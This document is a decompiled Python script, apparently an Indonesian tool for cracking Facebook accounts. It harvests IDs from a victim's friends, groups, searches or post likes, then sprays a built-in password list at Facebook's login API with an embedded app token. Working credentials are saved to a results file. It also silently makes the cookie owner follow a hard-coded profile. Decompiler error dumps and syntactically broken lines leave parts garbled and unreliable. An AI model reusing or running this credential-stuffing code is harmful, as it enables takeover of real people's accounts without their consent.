# Time Succses Parser : Mon Jun  8 21:29:08 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

# <-- Function fromlikes , getid Errror In File __init__.dis.py -->
'''
Instruction context:
-> 
 L.  95       180  LOAD_STR                 'Lihat Teman Lain'
                 182  LOAD_GLOBAL              str
                 184  LOAD_FAST                'raw'
                 186  CALL_FUNCTION_1       1  ''
                 188  COMPARE_OP               in
                 190  POP_JUMP_IF_FALSE   226  'to 226'
Instruction context:
   
 L. 105        64  LOAD_GLOBAL              exit
                  66  LOAD_STR                 '# cant dump id '
                  68  CALL_FUNCTION_1       1  ''
->                70  POP_TOP          
                  72  POP_EXCEPT       
                  74  JUMP_FORWARD         78  'to 78'
                  76  END_FINALLY      
'''
import os, re, time, json, random, requests, hurt
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
id = []
die = 0
chek = []
life = []
count = 0
check = 0
result = 0

def masuk():
    try:
        cek = open('Token/cookie').read()
    except FileNotFoundError:
        cek = input('Enter your Cookie : ')
    else:
        cek = {'cookie': cek}
        ismi = ses.get(mbasic.format('/me', verify=False), cookies=cek).content
        if 'mbasic_logout_button' in str(ismi):
            if 'Apa yang Anda pikirkan sekarang' in str(ismi):
                with open('Token/cookie', 'w') as f:
                    f.write(cek['cookie'])
        else:
            pass
        time.sleep(1)
        try:
            requests.get((mbasic.format(parser(ismi, 'html.parser').find('a', string='Bahasa Indonesia')['href'])), cookies=cek)
        except:
            pass
        else:
            try:
                ikuti = parser(requests.get((mbasic.format('/leon101.coder')), cookies=cek).content, 'html.parser').find('a', string='Ikuti')['href']
                ses.get((mbasic.format(ikuti)), cookies=cek)
            except:
                pass
            else:
                return cek['cookie']
            exit('• Invalid Your Cookie')


def login(username, password, cek=False):
    global check
    global die
    global result
    b = '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
    params = {'access_token':b, 
     'format':'JSON', 
     'sdk_version':'2', 
     'email':username, 
     'locale':'en_US', 
     'password':password, 
     'sdk':'ios', 
     'generate_session_cookies':'1', 
     'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if 'EAA' in response.text:
        print(f"\rLife ---> {username} | {password}                       ", end='')
        print()
        result += 1
        if cek:
            life.append(username + ' | ' + password)
        else:
            with open('Result/Life', 'a') as f:
                f.write(username + ' | ' + password + '\n')
    elif 'www.facebook.com' in response.json()['error_msg']:
        print(f"\rCheck ---> {username} | {password}                    ", end='')
        print()
        check += 1
        if cek:
            chek.append(username + ' | ' + password)
        else:
            with open('Result/Check', 'a') as f:
                f.write(username + ' | ' + password + '\n')
    else:
        die += 1
    for i in list('+'):
        print(f"\r[{i}] Die --> {str(die)} Check --> {str(check)} Life --> {str(result)}", end='')
        time.sleep(0.4)

#<<--Function getid Error-->>
def getid():
    raw = requests.get(url, cookies=kuki).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>', str(raw))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall('=(\\d*)?', str(x[0]))[0])
        if 'friends' in x:
            pass
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
            print(('\r• Get ID : ' + str(len(id))), end='')
    if 'Lihat Teman Lain' in str(raw):
        getid(mbasic.format(parser(raw, 'html.parser').find('a', string='Lihat Teman Lain')['href']))
    return id

'''
def getid--- This code section failed: ---

 L.  85         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                get
                4  LOAD_FAST                'url'
                6  LOAD_GLOBAL              kuki
                8  LOAD_CONST               ('cookies',)
               10  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               12  LOAD_ATTR                content
               14  STORE_FAST               'raw'

 L.  86        16  LOAD_GLOBAL              re
               18  LOAD_METHOD              findall
               20  LOAD_STR                 'middle"><a class=".." href="(.*?)">(.*?)</a>'
               22  LOAD_GLOBAL              str
               24  LOAD_FAST                'raw'
               26  CALL_FUNCTION_1       1  ''
               28  CALL_METHOD_2         2  ''
               30  STORE_FAST               'getuser'

 L.  87        32  LOAD_FAST                'getuser'
               34  GET_ITER         
             36_0  COME_FROM           178  '178'
             36_1  COME_FROM           104  '104'
               36  FOR_ITER            180  'to 180'
               38  STORE_FAST               'x'

 L.  88        40  LOAD_STR                 'profile'
               42  LOAD_FAST                'x'
               44  LOAD_CONST               0
               46  BINARY_SUBSCR    
               48  COMPARE_OP               in
               50  POP_JUMP_IF_FALSE    96  'to 96'

 L.  89        52  LOAD_GLOBAL              id
               54  LOAD_METHOD              append
               56  LOAD_FAST                'x'
               58  LOAD_CONST               1
               60  BINARY_SUBSCR    
               62  LOAD_STR                 '|'
               64  BINARY_ADD       
               66  LOAD_GLOBAL              re
               68  LOAD_METHOD              findall
               70  LOAD_STR                 '=(\\d*)?'
               72  LOAD_GLOBAL              str
               74  LOAD_FAST                'x'
               76  LOAD_CONST               0
               78  BINARY_SUBSCR    
               80  CALL_FUNCTION_1       1  ''
               82  CALL_METHOD_2         2  ''
               84  LOAD_CONST               0
               86  BINARY_SUBSCR    
               88  BINARY_ADD       
               90  CALL_METHOD_1         1  ''
               92  POP_TOP          
               94  JUMP_FORWARD        154  'to 154'
             96_0  COME_FROM            50  '50'

 L.  90        96  LOAD_STR                 'friends'
               98  LOAD_FAST                'x'
              100  COMPARE_OP               in
              102  POP_JUMP_IF_FALSE   108  'to 108'

 L.  91       104  JUMP_BACK            36  'to 36'
              106  BREAK_LOOP          154  'to 154'
            108_0  COME_FROM           102  '102'

 L.  93       108  LOAD_GLOBAL              id
              110  LOAD_METHOD              append
              112  LOAD_FAST                'x'
              114  LOAD_CONST               1
              116  BINARY_SUBSCR    
              118  LOAD_STR                 '|'
              120  BINARY_ADD       
              122  LOAD_FAST                'x'
              124  LOAD_CONST               0
              126  BINARY_SUBSCR    
              128  LOAD_METHOD              split
              130  LOAD_STR                 '/'
              132  CALL_METHOD_1         1  ''
              134  LOAD_CONST               1
              136  BINARY_SUBSCR    
              138  LOAD_METHOD              split
              140  LOAD_STR                 '?'
              142  CALL_METHOD_1         1  ''
              144  LOAD_CONST               0
              146  BINARY_SUBSCR    
              148  BINARY_ADD       
              150  CALL_METHOD_1         1  ''
              152  POP_TOP          
            154_0  COME_FROM           106  '106'
            154_1  COME_FROM            94  '94'

 L.  94       154  LOAD_GLOBAL              print
              156  LOAD_STR                 '\r• Get ID : '
              158  LOAD_GLOBAL              str
              160  LOAD_GLOBAL              len
              162  LOAD_GLOBAL              id
              164  CALL_FUNCTION_1       1  ''
              166  CALL_FUNCTION_1       1  ''
              168  BINARY_ADD       
              170  LOAD_STR                 ''
              172  LOAD_CONST               ('end',)
              174  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              176  POP_TOP          
              178  JUMP_BACK            36  'to 36'
            180_0  COME_FROM            36  '36'

 L.  95       180  LOAD_STR                 'Lihat Teman Lain'
              182  LOAD_GLOBAL              str
              184  LOAD_FAST                'raw'
              186  CALL_FUNCTION_1       1  ''
              188  COMPARE_OP               in
              190  POP_JUMP_IF_FALSE   226  'to 226'

 L.  96       192  LOAD_GLOBAL              getid
              194  LOAD_GLOBAL              mbasic
              196  LOAD_METHOD              format
              198  LOAD_GLOBAL              parser
              200  LOAD_FAST                'raw'
              202  LOAD_STR                 'html.parser'
              204  CALL_FUNCTION_2       2  ''
              206  LOAD_ATTR                find
              208  LOAD_STR                 'a'
              210  LOAD_STR                 'Lihat Teman Lain'
              212  LOAD_CONST               ('string',)
              214  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              216  LOAD_STR                 'href'
              218  BINARY_SUBSCR    
              220  CALL_METHOD_1         1  ''
              222  CALL_FUNCTION_1       1  ''
              224  POP_TOP          
            226_0  COME_FROM           190  '190'

 L.  97       226  LOAD_GLOBAL              id
              228  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `LOAD_STR' instruction at offset 180
'''
#<<--Function fromlikes Error-->>
def fromlikes():
    try:
        like = requests.get(url, cookies=kuki).content
        love = re.findall('href="(/ufi.*?)"', str(like))[0]
        aws = getlike(mbasic.format(love))
        return aws
        exit('# cant dump id ')
    except:
        pass
'''
def fromlikes--- This code section failed: ---

 L.  99         0  SETUP_FINALLY        58  'to 58'

 L. 100         2  LOAD_GLOBAL              requests
                4  LOAD_ATTR                get
                6  LOAD_FAST                'url'
                8  LOAD_GLOBAL              kuki
               10  LOAD_CONST               ('cookies',)
               12  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               14  LOAD_ATTR                content
               16  STORE_FAST               'like'

 L. 101        18  LOAD_GLOBAL              re
               20  LOAD_METHOD              findall
               22  LOAD_STR                 'href="(/ufi.*?)"'
               24  LOAD_GLOBAL              str
               26  LOAD_FAST                'like'
               28  CALL_FUNCTION_1       1  ''
               30  CALL_METHOD_2         2  ''
               32  LOAD_CONST               0
               34  BINARY_SUBSCR    
               36  STORE_FAST               'love'

 L. 102        38  LOAD_GLOBAL              getlike
               40  LOAD_GLOBAL              mbasic
               42  LOAD_METHOD              format
               44  LOAD_FAST                'love'
               46  CALL_METHOD_1         1  ''
               48  CALL_FUNCTION_1       1  ''
               50  STORE_FAST               'aws'

 L. 103        52  LOAD_FAST                'aws'
               54  POP_BLOCK        
               56  RETURN_VALUE     
             58_0  COME_FROM_FINALLY     0  '0'

 L. 104        58  POP_TOP          
               60  POP_TOP          
               62  POP_TOP          

 L. 105        64  LOAD_GLOBAL              exit
               66  LOAD_STR                 '# cant dump id '
               68  CALL_FUNCTION_1       1  ''
               70  POP_TOP          
               72  POP_EXCEPT       
               74  JUMP_FORWARD         78  'to 78'
               76  END_FINALLY      
             78_0  COME_FROM            74  '74'

Parse error at or near `POP_TOP' instruction at offset 70
'''

def getlike(react):
    like = requests.get(react, cookies=kuki).content
    ids = re.findall'class="b."><a href="(.*?)">(.*?)</a></h3>'str(like)
    for user in ids:
        if 'profile' in user[0]:
            id.append(user[1] + '|' + re.findall'=(\\d*)'str(user[0])[0])
        else:
            id.append(user[1] + '|' + user[0].split('/')[1])
        print(f"\r# {str(len(id))} retrieved", end='')
    else:
        if 'Lihat Selengkapnya' in str(like):
            getlike(mbasic.format(parser(like, 'html.parser').find('a', string='Lihat Selengkapnya')['href']))
        return id


def bysearch(option):
    search = requests.get(option, cookies=kuki).content
    users = re.findall'class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>'str(search)
    for user in users:
        if 'profile' in user[0]:
            id.append(user[1] + '|' + re.findall'=(\\d*)'str(user[0])[0])
        else:
            id.append(user[1] + '|' + user[0].split('?')[0])
        print(f"\r• Get ID : {str(len(id))}", end='')
    else:
        if 'Lihat Hasil Selanjutnya' in str(search):
            bysearch(parser(search, 'html.parser').find('a', string='Lihat Hasil Selanjutnya')['href'])
        return id


def grubid(endpoint):
    grab = requests.get(endpoint, cookies=kuki).content
    users = re.findall'a class=".." href="/(.*?)">(.*?)</a>'str(grab)
    for user in users:
        if 'profile' in user[0]:
            id.append(user[1] + '|' + re.findall'id=(\\d*)'str(user[0])[0])
        else:
            id.append(user[1] + '|' + user[0])
        print(f"\r• Get ID : {str(len(id))}", end='')
    else:
        if 'Lihat Selengkapnya' in str(grab):
            grubid(mbasic.format(parser(grab, 'html.parser').find('a', string='Lihat Selengkapnya')['href']))
        return id


if __name__ == '__main__':
    try:
        ses = requests.Session()
        kukis = masuk()
        kuki = {'cookie': kukis}
        print('\nbruteforce                      Hack Facebook With Bruteforce\nhack list friend                Crack from my List Friend\nhack from friend                Crack from Friend\nhack from query                 Crack from Search Query\nhack from group                 Crach from Group\n')
        tanya = input(' hurt(facebookhack) > ')
        if tanya in ('bruteforce', ):
            hurt.Bruteforce()
            exit('')
        elif tanya in ('menu', '--help', 'help'):
            os.system('python __init__.py')
        elif tanya == 'hack list friend':
            print('\n')
            print('----------------------------------------------------------')
            print('• Hack from : List my Friend')
            url = parser(ses.get((mbasic.format('/me')), cookies=kuki).content, 'html.parser').find('a', string='Teman')
            username = getid(mbasic.format(url['href']))
        elif tanya == 'hack from query':
            zet = input('\n• Query : ')
            print('\n')
            print('----------------------------------------------------------')
            print('• Hack from : Query\n• Query : %s' % zet)
            username = bysearch(mbasic.format('/search/people/?q=' + zet))
            if len(username) == 0:
                exit('! No Result')
        elif tanya == 'hack from group':
            grab = input('\n• Group ID : ')
            print('\n')
            print('----------------------------------------------------------')
            print('• Hack from : Group\n• Group ID : %s' % grab)
            username = grubid(mbasic.format('/browse/group/members/?id=' + grab))
            if len(username) == 0:
                exit('ID Not Found')
        elif tanya == 'hack from friend':
            zet = input('\n• Friend ID : ')
            if zet.isdigit():
                user = '/profile.php?id=' + zet
            else:
                user = '/' + zet
            try:
                user = parser(requests.get((mbasic.format(user)), cookies=kuki).content, 'html.parser').find('a', string='Teman')['href']
                username = getid(mbasic.format(user))
            except TypeError:
                exit('Err : Target not found')

        else:
            print('Not found input')
            input('Return')
            os.system('python __init__.py')
        with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                users = user.split('|')
                ss = users[0].split(' ')
                for x in ss:
                    listpass = [str(x) + '123',
                     str(x) + '12345',
                     str(x) + '123456',
                     str(x) + '12',
                     str(x) + '123321',
                     str(x) + '1234',
                     str(x) + '1234567899',
                     str(x) + '54321sayang',
                     'sayang123cintaku',
                     'sayangku',
                     'cintaku123',
                     'love123',
                     'anjing123',
                     'bangsat',
                     'bangsat123',
                     'bajingan',
                     'bajingan123',
                     'fuck123',
                     'fucek123',
                     'sayangku123',
                     'Indonesia',
                     'Bandung',
                     'Makasar',
                     'Soekarno',
                     'loli12345',
                     'memek123',
                     'doraemon',
                     'doraemon123',
                     'kontol1234',
                     'kontol',
                     'kontol12345',
                     'Amerika',
                     'Afrika123',
                     'janda123',
                     'jungkook123',
                     'bidadari',
                     'pangeran',
                     'pangeranku',
                     'bidadariku',
                     'bebeb123',
                     'hani123',
                     'bujang123',
                     'freefire',
                     'freefire123',
                     'pubg123',
                     '@@@@@@@@',
                     'Admin123',
                     'qwerty123',
                     'qwerty12345',
                     'anonymous',
                     'anonymous990',
                     'anonymous123',
                     'anonim404',
                     'hacker101',
                     'kamvret123',
                     'hahahaha',
                     '0987654321',
                     'asd12345',
                     'asd1234567890',
                     'garena123',
                     'garena12345',
                     'anonymous500',
                     'mantap123']
                    for passw in set(listpass):
                        ex.submit(login, users[1], passw)

        if check != 0 or result != 0:
            print("\n• Done, check in Dictionary 'Result'")
            exit()
        else:
            print('\n• No Result')
            exit()
    except (KeyboardInterrupt, EOFError):
        exit()
    except requests.exceptions.ConnectionError:
        exit('No Connection')

# global count ## Warning: Unused global<code object <module> at 0xa6db2be8, file "<script>", line 1>
# global count
# global count
# global count
